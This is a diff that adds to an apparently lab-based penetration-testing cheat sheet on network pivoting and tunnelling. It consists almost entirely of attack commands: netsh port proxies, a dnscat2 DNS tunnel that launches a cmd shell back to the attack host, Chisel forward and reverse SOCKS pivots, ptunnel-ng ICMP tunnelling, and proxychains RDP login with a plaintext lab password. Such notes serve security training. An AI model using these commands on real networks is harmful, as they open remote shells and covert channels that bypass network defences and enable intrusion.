@@ -334,10 +334,100 @@ Netsh is a Windows command-line tool that can help with the network configuratio
 - Adding proxies
 - Creating port forwarding rules
 
+### Using Netsh.exe to Port Forward
+```
+C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
+```
+### Verifying Port Forward
+```
+C:\Windows\system32> netsh.exe interface portproxy show v4tov4
+```
+## DNS Tunneling with Dnscat2
+### Setting Up & Using dnscat2
+```
+git clone https://github.com/iagox86/dnscat2.git
+```
+### Starting the dnscat2 server
+```
+sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+```
+### Cloning dnscat2-powershell to the Attack Host
+```
+git clone https://github.com/lukebaggett/dnscat2-powershell.git
+```
+Importing dnscat2.ps1
+```
+Import-Module .\dnscat2.ps1
+Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+```
+We must use the pre-shared secret (-PreSharedSecret) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.
 
+## SOCKS5 Tunneling with Chisel
+### Setting up and using Chisel
+```
+git clone https://github.com/jpillora/chisel.git
+cd chisel
+go build
+```
+### Transferring Chisel Binary to Pivot Host
+```
+scp chisel ubuntu@10.129.202.64:~/
+```
+### Running the Chisel Server on the Pivot Host
+```
+ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
+```
+### Connecting to the Chisel Server
+```
+./chisel client -v 10.129.202.64:1234 socks
+```
+Edit and Configure proxychains.conf
+### Pivoting to the DC
+```
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+```
+## Chisel Reverse Pivot
+### Starting the Chisel Server on our Attack Host
+```
+sudo ./chisel server --reverse -v -p 1234 --socks5
+```
+### Connecting the Chisel Client to our Attack Host
+```
+./chisel client -v 10.10.14.17:1234 R:socks
+```
+Edit and configure proxychains.conf
 
+## ICMP  Tunneling with SOCKS 
+### Setting Up & Using ptunnel-ng
+```
+git clone https://github.com/utoni/ptunnel-ng.git
+sudo ./autogen.sh
+```
 
-
+### Transferring Ptunnel-ng to the Pivot Host
+```
+scp -r ptunnel-ng ubuntu@10.129.202.64:~/
+```
+### Starting the ptunnel-ng Server on the Target Host
+```
+ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
+```
+### Connecting to ptunnel-ng Server from Attack Host
+```
+sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
+```
+### Tunneling an SSH connection through an ICMP Tunnel
+```
+ssh -p2222 -lubuntu 127.0.0.1
+```
+### Enabling Dynamic Port Forwarding over SSH
+```
+ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+```
+Proxychaining through the ICMP Tunnel
+```
+proxychains nmap -sV -sT 172.16.5.19 -p3389
+```
 
 
 
